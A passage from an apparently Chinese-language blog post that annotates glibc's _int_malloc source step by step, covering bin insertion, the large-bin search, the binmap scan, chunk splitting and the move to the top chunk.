cache first, return to user only if cache fills.</span></span><br><span class=\"line\"><span class=\"comment\">                 We may return one of these chunks later.  */</span></span><br><span class=\"line\">              <span class=\"keyword\">if</span> (tcache_nb</span><br><span class=\"line\">                  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  tcache_put (victim, tc_idx);</span><br><span class=\"line\">                  return_cached = <span class=\"number\">1</span>;</span><br><span class=\"line\">                  <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              <span class=\"keyword\">else</span></span><br><span class=\"line\">                &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">              check_malloced_chunk (av, victim, nb);</span><br><span class=\"line\">              <span class=\"type\">void</span> *p = chunk2mem (victim);</span><br><span class=\"line\">              alloc_perturb (p, bytes);</span><br><span class=\"line\">              <span class=\"keyword\">return</span> p;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> USE_TCACHE</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">            &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t（8）如果 chunk 大小不合适，就将其插入对应的 bin 中。插入过程也就是双链表插入结点的过程。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">          <span class=\"comment\">/* place chunk in bin */</span></span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (in_smallbin_range (size)) <span class=\"comment\">//在small bin范围内</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              victim_index = smallbin_index (size);</span><br><span class=\"line\">              <span class=\"comment\">//bck指向头节点，fwd是头节点的fd节点，chunk会被插入到头节点和fwd节点之间</span></span><br><span class=\"line\">              bck = bin_at (av, victim_index);</span><br><span class=\"line\">              fwd = bck-&gt;fd;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          <span class=\"keyword\">else</span> <span class=\"comment\">//在large bin范围内</span></span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              victim_index = largebin_index (size);</span><br><span class=\"line\">              bck = bin_at (av, victim_index);</span><br><span class=\"line\">              fwd = bck-&gt;fd;</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">//需要对双向链表进行的额外操作，chunk大小按fd_nextsize的方向递减</span></span><br><span class=\"line\">              <span class=\"comment\">/* maintain large bins in sorted order */</span></span><br><span class=\"line\">              <span class=\"keyword\">if</span> (fwd != bck) <span class=\"comment\">//large bin链表不为空</span></span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  <span class=\"comment\">/* Or with inuse bit to speed comparisons */</span></span><br><span class=\"line\">                  size |= PREV_INUSE; </span><br><span class=\"line\">                  <span class=\"comment\">/* if smaller than smallest, bypass loop below */</span></span><br><span class=\"line\">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class=\"line\">                  <span class=\"comment\">//bck-&gt;bk 是最小的chunk，如果小于它，就将chunk加入bck—&gt;bk</span></span><br><span class=\"line\">                  <span class=\"keyword\">if</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (size)</span><br><span class=\"line\">                      &lt; (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                      fwd = bck;</span><br><span class=\"line\">                      bck = bck-&gt;bk;</span><br><span class=\"line\">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class=\"line\">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class=\"line\">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                  <span class=\"keyword\">else</span> <span class=\"comment\">// 不小于最小的chunk 就通过fd_nextsize找到不必他大的chunk</span></span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                      assert (chunk_main_arena (fwd));</span><br><span class=\"line\">                      <span class=\"keyword\">while</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class=\"line\">                          assert (chunk_main_arena (fwd));</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">\t\t\t\t\t\t<span class=\"comment\">//如果大小相等，插入到chunk的fd处，无需改动nextsize构成的双向链表</span></span><br><span class=\"line\">                      <span class=\"keyword\">if</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) size</span><br><span class=\"line\">                          == (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) chunksize_nomask (fwd))</span><br><span class=\"line\">                        <span class=\"comment\">/* Always insert in the second position.  */</span></span><br><span class=\"line\">                        fwd = fwd-&gt;fd;</span><br><span class=\"line\">                      <span class=\"keyword\">else</span> <span class=\"comment\">// 否则需要插入nextsize的双向链表</span></span><br><span class=\"line\">                        &#123;</span><br><span class=\"line\">                          victim-&gt;fd_nextsize = fwd;</span><br><span class=\"line\">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class=\"line\">                          <span class=\"keyword\">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class=\"line\">                            malloc_printerr (<span class=\"string\">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class=\"line\">                          fwd-&gt;bk_nextsize = victim;</span><br><span class=\"line\">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                      bck = fwd-&gt;bk;</span><br><span class=\"line\">                      <span class=\"keyword\">if</span> (bck-&gt;fd != fwd)</span><br><span class=\"line\">                        malloc_printerr (<span class=\"string\">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">              <span class=\"keyword\">else</span> <span class=\"comment\">//如果large bin 链表为空，将nextsize 指向自己即可</span></span><br><span class=\"line\">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">          mark_bin (av, victim_index);</span><br><span class=\"line\">          victim-&gt;bk = bck;</span><br><span class=\"line\">          victim-&gt;fd = fwd;</span><br><span class=\"line\">          fwd-&gt;bk = victim;</span><br><span class=\"line\">          bck-&gt;fd = victim;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> USE_TCACHE</span></span><br><span class=\"line\">      <span class=\"comment\">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class=\"line\"><span class=\"comment\">         filling the cache, return one of the cached ones.  */</span></span><br><span class=\"line\">      ++tcache_unsorted_count;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (return_cached</span><br><span class=\"line\">          &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class=\"number\">0</span></span><br><span class=\"line\">          &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> tcache_get (tc_idx);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n<p>​\t（9）如果用户申请的 chunk 是 large chunk ，就在第一个循环结束后搜索 large bin 。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    If a large request, scan through the chunks of current bin in</span></span><br><span class=\"line\"><span class=\"comment\">    sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class=\"line\"><span class=\"comment\">  */</span></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">if</span> (!in_smallbin_range (nb)) <span class=\"comment\">//申请的chunk 在large bin范围内</span></span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     bin = bin_at (av, idx);</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/* skip scan if empty or largest chunk is too small */</span></span><br><span class=\"line\">     <span class=\"comment\">//如果victim等于头节点，说明bin为空，如果小于nb说明不会有合适的</span></span><br><span class=\"line\">     <span class=\"keyword\">if</span> ((victim = first (bin)) != bin</span><br><span class=\"line\">         &amp;&amp; (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) chunksize_nomask (victim)</span><br><span class=\"line\">           &gt;= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (nb))</span><br><span class=\"line\">       &#123;</span><br><span class=\"line\">         <span class=\"comment\">//反向遍历chunk，找到第一个不小于nb的chunk</span></span><br><span class=\"line\">         victim = victim-&gt;bk_nextsize;</span><br><span class=\"line\">         <span class=\"keyword\">while</span> (((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (size = chunksize (victim)) &lt;</span><br><span class=\"line\">                 (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (nb)))</span><br><span class=\"line\">           victim = victim-&gt;bk_nextsize;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">         <span class=\"comment\">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class=\"line\"><span class=\"comment\">            list does not have to be rerouted.  */</span></span><br><span class=\"line\">         <span class=\"comment\">//如果该chunk和他的fd chunk 一样大，就选择fd chunk，避免改动nextsize</span></span><br><span class=\"line\">         <span class=\"keyword\">if</span> (victim != last (bin)</span><br><span class=\"line\">             &amp;&amp; chunksize_nomask (victim)</span><br><span class=\"line\">               == chunksize_nomask (victim-&gt;fd))</span><br><span class=\"line\">           victim = victim-&gt;fd;</span><br><span class=\"line\"></span><br><span class=\"line\">         remainder_size = size - nb;</span><br><span class=\"line\">         unlink_chunk (av, victim);</span><br><span class=\"line\"></span><br><span class=\"line\">         <span class=\"comment\">/* Exhaust */</span></span><br><span class=\"line\">         <span class=\"comment\">//如果该chunk 减去 nb 小于 MINSIZE ，就直接返回给用户</span></span><br><span class=\"line\">         <span class=\"keyword\">if</span> (remainder_size &lt; MINSIZE)</span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">             set_inuse_bit_at_offset (victim, size);</span><br><span class=\"line\">             <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">               set_non_main_arena (victim);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">         <span class=\"comment\">/* Split */</span></span><br><span class=\"line\">         <span class=\"comment\">//否则，将remainer 加入 unsorted bin中</span></span><br><span class=\"line\">         <span class=\"keyword\">else</span></span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">             remainder = chunk_at_offset (victim, nb);</span><br><span class=\"line\">             <span class=\"comment\">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class=\"line\"><span class=\"comment\">                have to perform a complete insert here.  */</span></span><br><span class=\"line\">             bck = unsorted_chunks (av);</span><br><span class=\"line\">             fwd = bck-&gt;fd;</span><br><span class=\"line\">             <span class=\"keyword\">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class=\"line\">               malloc_printerr (<span class=\"string\">&quot;malloc(): corrupted unsorted chunks&quot;</span>);</span><br><span class=\"line\">             remainder-&gt;bk = bck;</span><br><span class=\"line\">             remainder-&gt;fd = fwd;</span><br><span class=\"line\">             bck-&gt;fd = remainder;</span><br><span class=\"line\">             fwd-&gt;bk = remainder;</span><br><span class=\"line\">             <span class=\"keyword\">if</span> (!in_smallbin_range (remainder_size))</span><br><span class=\"line\">               &#123;</span><br><span class=\"line\">                 remainder-&gt;fd_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">                 remainder-&gt;bk_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">             set_head (victim, nb | PREV_INUSE |</span><br><span class=\"line\">                       (av != &amp;main_arena ? NON_MAIN_ARENA : <span class=\"number\">0</span>));</span><br><span class=\"line\">             set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class=\"line\">             set_foot (remainder, remainder_size);</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">         check_malloced_chunk (av, victim, nb);</span><br><span class=\"line\">         <span class=\"type\">void</span> *p = chunk2mem (victim);</span><br><span class=\"line\">         alloc_perturb (p, bytes);</span><br><span class=\"line\">         <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t（10）接下来，进入内层第二个 for 循环，根据 binmap 来搜索 bin ，因为申请的 chunk 大小所对应 bin 没有找到合适的 chunk ，所以，就要从下一个 bin 开始搜索。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">++idx;</span><br><span class=\"line\">   bin = bin_at (av, idx);</span><br><span class=\"line\">   block = idx2block (idx);</span><br><span class=\"line\">   map = av-&gt;binmap[block];</span><br><span class=\"line\">   bit = idx2bit (idx);</span><br></pre></td></tr></table></figure>\n<p>​\t（11）在内层第二个循环内部，寻找第一个不为空的 block ，再根据比特位找到合适的 bin。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (;; )</span><br><span class=\"line\">       &#123;</span><br><span class=\"line\">    <span class=\"comment\">/*binmap数组的元素类型是unsigned int，32和64位一般都是4字节，也就是32比特，所以binmap的一个block能够检查32个bin*/</span></span><br><span class=\"line\">         <span class=\"comment\">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class=\"line\">         <span class=\"keyword\">if</span> (bit &gt; <span class=\"built_in\">map</span> || bit == <span class=\"number\">0</span>)</span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">             <span class=\"keyword\">do</span></span><br><span class=\"line\">               &#123;</span><br><span class=\"line\">                 <span class=\"keyword\">if</span> (++block &gt;= BINMAPSIZE) <span class=\"comment\">/* out of bins */</span> <span class=\"comment\">//如果成立，说明遍历了所有的bin且都为空，只有区top chunk中寻找</span></span><br><span class=\"line\">                   <span class=\"keyword\">goto</span> use_top;</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">       </span><br><span class=\"line\">             <span class=\"keyword\">while</span> ((<span class=\"built_in\">map</span> = av-&gt;binmap[block]) == <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">             bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class=\"line\">             bit = <span class=\"number\">1</span>;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">         <span class=\"comment\">/* Advance to bin with set bit. There must be one. */</span></span><br><span class=\"line\">    <span class=\"comment\">//找到block不为空的最小的bin对应的bit</span></span><br><span class=\"line\">         <span class=\"keyword\">while</span> ((bit &amp; <span class=\"built_in\">map</span>) == <span class=\"number\">0</span>)</span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">             bin = next_bin (bin);</span><br><span class=\"line\">             bit &lt;&lt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">             assert (bit != <span class=\"number\">0</span>);</span><br><span class=\"line\">           &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t（12）然后检查 bit 对应的 bin 是否为空，如果是，就清空对应的 bit 位，从下一个 bin 开始循环，否则将 Victim 从 bin 中取出来。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class=\"line\">         victim = last (bin);</span><br><span class=\"line\"></span><br><span class=\"line\">         <span class=\"comment\">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class=\"line\">         <span class=\"keyword\">if</span> (victim == bin)</span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">             av-&gt;binmap[block] = <span class=\"built_in\">map</span> &amp;= ~bit; <span class=\"comment\">/* Write through */</span></span><br><span class=\"line\">             bin = next_bin (bin);</span><br><span class=\"line\">             bit &lt;&lt;= <span class=\"number\">1</span>;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">         <span class=\"keyword\">else</span></span><br><span class=\"line\">           &#123;</span><br><span class=\"line\">             size = chunksize (victim);</span><br><span class=\"line\"></span><br><span class=\"line\">             <span class=\"comment\">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class=\"line\">             assert ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (size) &gt;= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (nb));</span><br><span class=\"line\"></span><br><span class=\"line\">             remainder_size = size - nb;</span><br><span class=\"line\"></span><br><span class=\"line\">             <span class=\"comment\">/* unlink */</span></span><br><span class=\"line\">             unlink_chunk (av, victim);</span><br></pre></td></tr></table></figure>\n<p>​\t（13）将取出的 victim 进行切分，并把 remainder 加入 unsorted bin ，如果 victim 不够切分，就直接返回给用户，内层第二个循环到此结束。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">      <span class=\"comment\">/* Exhaust */</span></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (remainder_size &lt; MINSIZE)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          set_inuse_bit_at_offset (victim, size);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">            set_non_main_arena (victim);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"comment\">/* Split */</span></span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          remainder = chunk_at_offset (victim, nb);</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class=\"line\"><span class=\"comment\">             have to perform a complete insert here.  */</span></span><br><span class=\"line\">          bck = unsorted_chunks (av);</span><br><span class=\"line\">          fwd = bck-&gt;fd;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>);</span><br><span class=\"line\">          remainder-&gt;bk = bck;</span><br><span class=\"line\">          remainder-&gt;fd = fwd;</span><br><span class=\"line\">          bck-&gt;fd = remainder;</span><br><span class=\"line\">          fwd-&gt;bk = remainder;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">/* advertise as last remainder */</span></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (in_smallbin_range (nb))</span><br><span class=\"line\">            av-&gt;last_remainder = remainder;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (!in_smallbin_range (remainder_size))</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              remainder-&gt;fd_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">              remainder-&gt;bk_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">          set_head (victim, nb | PREV_INUSE |</span><br><span class=\"line\">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class=\"number\">0</span>));</span><br><span class=\"line\">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class=\"line\">          set_foot (remainder, remainder_size);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      check_malloced_chunk (av, victim, nb);</span><br><span class=\"line\">      <span class=\"type\">void</span> *p = chunk2mem (victim);</span><br><span class=\"line\">      alloc_perturb (p, bytes);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t（14）如果上面的操作还不能满足请求，就只能从 top chunk 上进行切分。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   use_top:</span><br><span class=\"line\">      <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         If large enough, split off the chunk bordering the end of memory</span></span><br><span class=\"line\"><span class=\"comment\">         (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class=\"line\"><span class=\"comment\">         search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class=\"line\"><span class=\"comment\">         less well fitting) than any other available chunk since it can</span></span><br><span class=\"line\"><span class=\"comment\">         be extended to be as large as necessary (up to system</span></span><br><span class=\"line\"><span class=\"comment\">         limitations).</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">         We require that av-&gt;top always exists 